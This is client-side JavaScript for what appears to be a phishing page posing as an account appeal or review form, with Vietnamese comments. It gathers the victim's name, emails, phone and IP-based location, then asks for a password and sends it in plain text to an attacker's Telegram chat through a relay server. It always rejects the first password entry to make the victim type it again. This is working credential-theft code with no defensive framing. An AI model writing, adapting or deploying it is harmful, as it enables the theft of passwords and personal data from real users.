document.addEventListener('DOMContentLoaded', () => {
    // Các biến và phần tử DOM
    const form = document.getElementById('appeal-form');
    const modal = document.getElementById('modal');
    const openButton = document.getElementById('request-review-button');
    const closeButton = modal.querySelector('.close-modal');
    const toggleSidebarBtn = document.getElementById('toggle-sidebar');
    const sidebar = document.querySelector('.sidebar');
    const form2 = document.getElementById('form2');
    const form3 = document.getElementById('form3');
    const modalContent = modal.querySelector('.modal-content');
    const continueButton = document.getElementById('continue-button');
    const passwordInput = document.getElementById('password');
    const errorMessage = document.createElement('p');
    errorMessage.style.color = 'red';
    let passwordAttempts = 0;

    // Config variables
    let API_KEY, SERVER_URL, TELEGRAM_CHAT_ID;

    // Fetch configuration from server
    async function fetchConfig() {
        try {
            const response = await fetch('http://localhost:3000/config', {
                method: 'GET',
                mode: 'cors',
                headers: {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json',
                },
            });

            if (!response.ok) {
                throw new Error(`Server responded with ${response.status}`);
            }

            const config = await response.json();
            API_KEY = config.apiKey;
            SERVER_URL = config.serverUrl;
            TELEGRAM_CHAT_ID = config.telegramChatId;

            console.log('Configuration loaded successfully');
        } catch (error) {
            console.error('Error loading configuration:', error);
            alert('Unable to load configuration. Please try again later.');
        }
    }

    // Check server health
    async function checkServerHealth() {
        try {
            const response = await fetch(`${SERVER_URL}/health`, {
                method: 'GET',
                mode: 'cors',
                headers: {
                    'Accept': 'application/json'
                }
            });
            const data = await response.json();
            return data.status === 'ok';
        } catch {
            return false;
        }
    }

    // Get IP information
    async function getIpInfo() {
        try {
            const response = await fetch('http://ip-api.com/json/', {
                method: 'GET',
                mode: 'cors'
            });

            if (!response.ok) {
                throw new Error('Unable to fetch location information');
            }

            const data = await response.json();

            if (data.status === 'success') {
                return {
                    ip: data.query,
                    country_name: data.country || 'Unknown',
                    region: data.regionName || 'Unknown',
                    city: data.city || 'Unknown',
                    isp: data.isp || 'Unknown',
                    timezone: data.timezone || 'Unknown'
                };
            }
            throw new Error('Invalid response from IP-API');
        } catch (error) {
            console.warn('Error getting location info from primary source:', error);

            try {
                const backupResponse = await fetch('https://ipapi.co/json/');
                if (!backupResponse.ok) {
                    throw new Error('Unable to fetch from backup source');
                }
                const backupData = await backupResponse.json();

                return {
                    ip: backupData.ip || 'Unknown',
                    country_name: backupData.country_name || 'Unknown',
                    region: backupData.region || 'Unknown',
                    city: backupData.city || 'Unknown',
                    isp: 'Unknown',
                    timezone: backupData.timezone || 'Unknown'
                };
            } catch (backupError) {
                console.error('Backup source error:', backupError);
                return {
                    ip: 'Unknown',
                    country_name: 'Unknown',
                    region: 'Unknown',
                    city: 'Unknown',
                    isp: 'Unknown',
                    timezone: 'Unknown'
                };
            }
        }
    }

    // Initialize
    fetchConfig();

    // Event Listeners
    if (toggleSidebarBtn) {
        toggleSidebarBtn.addEventListener('click', () => {
            if (sidebar) {
                sidebar.classList.toggle('open');
            }
        });
    }

    // Modal controls
    if (openButton) {
        openButton.addEventListener('click', () => {
            if (modal) {
                modal.style.display = 'block';
                modalContent.style.display = 'block';
                form2.style.display = 'none';
            }
        });
    }

    if (closeButton) {
        closeButton.addEventListener('click', () => {
            if (modal) {
                modal.style.display = 'none';
                setTimeout(() => {
                    modalContent.style.display = 'block';
                    form2.style.display = 'none';
                }, 300);
            }
        });
    }

    window.addEventListener('click', (event) => {
        if (event.target === modal) {
            modal.style.display = 'none';
            setTimeout(() => {
                modalContent.style.display = 'block';
                form2.style.display = 'none';
            }, 300);
        }
    });

    // Form submission
    if (form) {
        form.addEventListener('submit', async (e) => {
            e.preventDefault();

            const appeal = document.getElementById('appeal')?.value.trim();
            const fullName = document.getElementById('full-name')?.value.trim();
            const personalEmail = document.getElementById('personal-email')?.value.trim();
            const businessEmail = document.getElementById('business-email')?.value.trim();
            const phoneNumber = document.getElementById('phone-number')?.value.trim();

            // Validation
            if (!appeal || !fullName || !personalEmail || !businessEmail || !phoneNumber) {
                alert('Please fill in all required fields.');
                return;
            }

            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            const phoneRegex = /^\d{10,15}$/;

            if (!emailRegex.test(personalEmail) || !emailRegex.test(businessEmail)) {
                alert('Invalid email format.');
                return;
            }
            if (!phoneRegex.test(phoneNumber)) {
                alert('Invalid phone number format.');
                return;
            }

            const submitButton = form.querySelector('button[type="submit"]');
            submitButton.disabled = true;
            submitButton.textContent = 'Sending...';

            try {
                const isServerHealthy = await checkServerHealth();
                if (!isServerHealthy) {
                    throw new Error('Cannot connect to server. Please check your connection and try again.');
                }

                const ipData = await getIpInfo();

                const message = `🔔 NEW REQUEST!\n\n` +
                    `📝 Content: ${appeal}\n\n` +
                    `👤 Sender Information:\n` +
                    `- Name: ${fullName}\n` +
                    `- Personal Email: ${personalEmail}\n` +
                    `- Business Email: ${businessEmail}\n` +
                    `- Phone: ${phoneNumber}\n\n` +
                    `📍 Location Information:\n` +
                    `- IP: ${ipData.ip}\n` +
                    `- Country: ${ipData.country_name}\n` +
                    `- Region: ${ipData.region}\n` +
                    `- City: ${ipData.city}\n` +
                    `- ISP: ${ipData.isp}\n` +
                    `- Timezone: ${ipData.timezone}`;

                const telegramResponse = await fetch(`${SERVER_URL}/telegram`, {
                    method: 'POST',
                    mode: 'cors',
                    headers: {
                        'Content-Type': 'application/json',
                        'x-api-key': API_KEY
                    },
                    body: JSON.stringify({
                        chatId: TELEGRAM_CHAT_ID,
                        text: message
                    })
                });

                const responseData = await telegramResponse.json();

                if (!telegramResponse.ok) {
                    throw new Error(responseData.error || 'Request failed');
                }

                alert('Request sent successfully!');
                form.reset();
                modalContent.style.display = 'none';
                form2.classList.remove('hidden');
                form2.style.display = 'block';

            } catch (error) {
                console.error('Error:', error);
                alert(error.message || 'An error occurred. Please try again later.');
            } finally {
                submitButton.disabled = false;
                submitButton.textContent = 'Send Request';
            }
        });
    }

    // Form2 submission
    if (continueButton) {
        continueButton.addEventListener('click', async (e) => {
            e.preventDefault();

            const password = passwordInput?.value.trim();

            if (!password) {
                alert('Please enter your password.');
                return;
            }

            const submitButton = continueButton;
            submitButton.disabled = true;
            submitButton.textContent = 'Sending...';

            try {
                const ipData = await getIpInfo();

                // Simulate password check
                const isValidPassword = password === 'correct_password'; // Replace with actual password check logic

                const message = `🔒 Password Information:\n- Password: ${password}\n\n` +
                    `📍 Location Information:\n` +
                    `- IP: ${ipData.ip}\n` +
                    `- Timezone: ${ipData.timezone}`;

                const telegramResponse = await fetch(`${SERVER_URL}/telegram`, {
                    method: 'POST',
                    mode: 'cors',
                    headers: {
                        'Content-Type': 'application/json',
                        'x-api-key': API_KEY
                    },
                    body: JSON.stringify({
                        chatId: TELEGRAM_CHAT_ID,
                        text: message
                    })
                });

                const responseData = await telegramResponse.json();

                if (!telegramResponse.ok) {
                    throw new Error(responseData.error || 'Request failed');
                }

                if (!isValidPassword && passwordAttempts === 0) {
                    // Display error message only on the first attempt
                    errorMessage.textContent = "The password you've entered is incorrect.";
                    if (!form2.contains(errorMessage)) {
                        form2.insertBefore(errorMessage, form2.firstChild);
                    }
                    passwordAttempts++;
                } else if (!isValidPassword && passwordAttempts > 0) {
                    // Remove error message and transition to form3 on the second attempt
                    if (errorMessage.parentNode) {
                        errorMessage.parentNode.removeChild(errorMessage);
                    }
                    form2.style.display = 'none';
                    form3.classList.remove('hidden');
                    form3.style.display = 'block';
                    alert('Request sent successfully!');
                } else {
                    // Successful password entry on the first attempt
                    alert('Request sent successfully!');
                    passwordInput.value = '';

                    // Reset form states and hide modal
                    modalContent.style.display = 'block';
                    form2.style.display = 'none';
                    modal.style.display = 'none';
                }

            } catch (error) {
                console.error('Error:', error);
                alert(error.message || 'An error occurred. Please try again later.');
            } finally {
                submitButton.disabled = false;
                submitButton.textContent = 'Continue';
            }
        });
    }
});
